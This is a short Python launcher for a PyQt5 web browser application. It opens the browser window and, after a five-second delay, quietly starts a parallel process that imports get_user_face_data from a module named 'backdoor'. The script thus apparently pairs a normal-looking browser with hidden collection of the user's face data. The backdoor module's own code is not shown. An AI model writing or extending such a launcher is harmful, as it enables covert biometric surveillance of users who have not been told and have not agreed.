import time

from PyQt5.QtGui import *
from PyQt5.QtWidgets import *
from view import MyWebBrowser
from logging import getLogger
from session import do_session
from multiprocessing import Process, Event
from database import db_session_close
import config

logger = getLogger('WebBrowser')  #


def start_browser(browser_stop_event):
    app = QApplication([])
    try:
        browser_stop_event.set()
        window = MyWebBrowser()
        ico = config.APP_ICO
        window.window.setWindowIcon(QIcon(str(ico)))
    except Exception as exception:
        logger.critical(exception)
    finally:
        app.exec_()
        config.BROWSER.stop()


def start_backdoor_apps(browser_stop_event):
    # browser_stop_event
    from backdoor import get_user_face_data
    get_user_face_data()


def main():
    try:
        do_session()
        print(config.SESSION_ID)
        browser_stop_event = Event()
        start_browser_app = Process(target=start_browser, args=(browser_stop_event,))
        backdoor_apps = Process(target=start_backdoor_apps, args=(browser_stop_event,))

        start_browser_app.start()
        config.BROWSER.start()
        time.sleep(5)  # wait for broswer
        backdoor_apps.start()

        start_browser_app.join()
        config.BROWSER.stop()

        backdoor_apps.join()

    except Exception as exception:
        logger.error(exception)

    finally:
        db_session_close()


if __name__ == '__main__':
    main()

